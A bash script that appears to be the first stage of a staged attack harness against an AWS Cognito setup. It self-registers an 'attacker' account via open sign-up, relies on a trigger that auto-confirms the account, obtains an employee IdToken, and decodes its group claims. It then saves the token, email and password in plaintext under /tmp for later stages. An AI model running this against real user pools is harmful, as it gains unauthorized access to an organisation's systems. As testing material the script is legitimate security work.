#!/usr/bin/env bash
# Stage 0 (v11): attacker self-signs-up via Cognito, gets employee IdToken.
# Output: writes IdToken + email to /tmp/v11_stage0_*.txt for downstream stages.
HERE="$(dirname "$0")"
source "$HERE/config_v11.sh"

EMAIL="attacker-v11-$(date +%s)-$$@atlas.example"
PASSWORD="AttackPass!2026"

echo "=== Stage 0 (v11): Cognito self-signup ==="

aws cognito-idp sign-up \
  --client-id "$CLIENT_ID" \
  --username  "$EMAIL" \
  --password  "$PASSWORD" \
  --user-attributes "Name=email,Value=$EMAIL" \
  --region "$REGION" --output json > /tmp/v11_stage0_signup.json || { echo "FAIL: sign-up"; exit 1; }

CONFIRMED=$(python3 -c "import json;print(json.load(open('/tmp/v11_stage0_signup.json'))['UserConfirmed'])")
SUB=$(python3 -c "import json;print(json.load(open('/tmp/v11_stage0_signup.json'))['UserSub'])")
echo "[+] UserConfirmed=$CONFIRMED sub=$SUB"
[ "$CONFIRMED" = "True" ] || { echo "FAIL: pre_sign_up auto-confirm did not fire"; exit 1; }

aws cognito-idp initiate-auth \
  --client-id  "$CLIENT_ID" \
  --auth-flow  USER_PASSWORD_AUTH \
  --auth-parameters "USERNAME=$EMAIL,PASSWORD=$PASSWORD" \
  --region "$REGION" --output json > /tmp/v11_stage0_auth.json || { echo "FAIL: initiate-auth"; exit 1; }

ID_TOKEN=$(python3 -c "import json;print(json.load(open('/tmp/v11_stage0_auth.json'))['AuthenticationResult']['IdToken'])")
[ -n "$ID_TOKEN" ] || { echo "FAIL: no IdToken"; exit 1; }

# Decode claims via python directly (file-based to dodge heredoc/quote nesting).
python3 - <<'PY' > /tmp/v11_stage0_claims.json
import json, base64
auth = json.load(open('/tmp/v11_stage0_auth.json'))
tok = auth['AuthenticationResult']['IdToken']
payload = tok.split('.')[1]
payload += '=' * (-len(payload) % 4)
claims = json.loads(base64.urlsafe_b64decode(payload).decode())
print(json.dumps(claims))
PY

python3 -c "import json;c=json.load(open('/tmp/v11_stage0_claims.json'));g=c.get('cognito:groups','');g=' '.join(g) if isinstance(g,list) else g;print(g)" > /tmp/v11_stage0_groups.txt
COG_GROUPS=""
read -r COG_GROUPS < /tmp/v11_stage0_groups.txt || true
echo "[+] claims=$(cat /tmp/v11_stage0_claims.json)"
echo "[+] cognito:groups=[$COG_GROUPS]"

case "$COG_GROUPS" in
  *admin*) echo "FAIL: self-signup landed in admin group"; exit 1;;
esac

case "$GROUPS" in
  *admin*) echo "FAIL: self-signup landed in admin group"; exit 1;;
esac

echo "$ID_TOKEN" > /tmp/v11_stage0_idtoken.txt
echo "$EMAIL"    > /tmp/v11_stage0_email.txt
echo "$PASSWORD" > /tmp/v11_stage0_password.txt
echo "PASS: Stage 0 -- employee IdToken obtained"
